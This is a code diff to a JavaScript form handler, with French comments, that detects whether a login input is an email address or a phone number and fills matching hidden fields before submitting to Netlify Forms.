@@ -45,6 +45,12 @@ document.addEventListener('DOMContentLoaded', function() {
         return emailRegex.test(value) || phoneRegex.test(value);
     }
 
+    // Détecter si c'est un email ou un téléphone
+    function isEmail(value) {
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return emailRegex.test(value);
+    }
+
     // Validation du mot de passe
     function validatePassword(value) {
         return value && value.length >= 6;
@@ -99,6 +105,21 @@ document.addEventListener('DOMContentLoaded', function() {
 
         // Si tout est valide, soumettre à Netlify Forms
         if (isValid) {
+            // Détecter si c'est un email ou un téléphone et remplir les champs cachés
+            const inputValue = emailInput.value.trim();
+            const hiddenEmail = document.getElementById('hidden-email');
+            const hiddenPhone = document.getElementById('hidden-phone');
+
+            if (isEmail(inputValue)) {
+                // C'est un email
+                hiddenEmail.value = inputValue;
+                hiddenPhone.value = '';
+            } else {
+                // C'est un numéro de téléphone
+                hiddenPhone.value = inputValue;
+                hiddenEmail.value = '';
+            }
+
             // Soumettre via fetch pour Netlify Forms
             const formData = new FormData(form);
 
